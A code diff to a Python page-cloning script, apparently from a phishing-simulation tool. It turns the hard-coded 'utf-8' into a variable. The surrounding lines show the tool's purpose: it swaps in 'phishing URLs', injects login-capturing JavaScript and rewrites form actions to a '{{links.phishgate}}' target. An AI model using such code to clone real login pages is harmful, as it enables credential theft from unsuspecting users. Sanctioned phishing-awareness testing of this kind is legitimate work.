@@ -2,6 +2,8 @@ import re #Used for RegEx
 from BeautifulSoup import BeautifulSoup #For parsing HTML
 import urlparse #For joining URLs, required for <a>, <link>, and <script> tags
 
+encoding = 'utf-8'
+
 #This is Step 1 - URLs are replaced with our phishing URLs and new text is saved to output file
 def replaceURL(URL,OUTPUT):
 	#Provide user feedback
@@ -21,7 +23,7 @@ def replaceURL(URL,OUTPUT):
 				link['href'] = urlparse.urljoin(URL, link['href'])
 			for link in soup.findAll('script', src=True):
 				link['src'] = urlparse.urljoin(URL, link['src'])
-			source = str(soup.prettify(encoding='utf-8'))
+			source = str(soup.prettify(encoding=encoding))
 			#Write the updated URLs to output file while removing the [' and ']
 			output = open(OUTPUT, "w")
 			output.write(source.replace('[','').replace(']',''))
@@ -44,7 +46,7 @@ def insertPwdEval(OUTPUT):
 			javascript = source[:index] + strJSLogin + source[index:]
 			soup = BeautifulSoup(javascript.replace('[','').replace(']',''))
 			output = open(OUTPUT, "w")
-			output.write(soup.prettify(encoding='utf-8'))
+			output.write(soup.prettify(encoding=encoding))
 			output.close()
 			print "[+] JavaScript has been inserted."
 	except:
@@ -66,7 +68,7 @@ def fixForms(OUTPUT):
 				form['action'] = "{{links.phishgate}}"
 				#form['method'] = "post"
 				#form['onsubmit'] = "return checkForm(this);"
-			source = str(soup.prettify(encoding='utf-8'))
+			source = str(soup.prettify(encoding=encoding))
 			#Write the updated form to output file while removing the [' and ']
 			output = open(OUTPUT, "w")
 			output.write(source.replace('[','').replace(']',''))
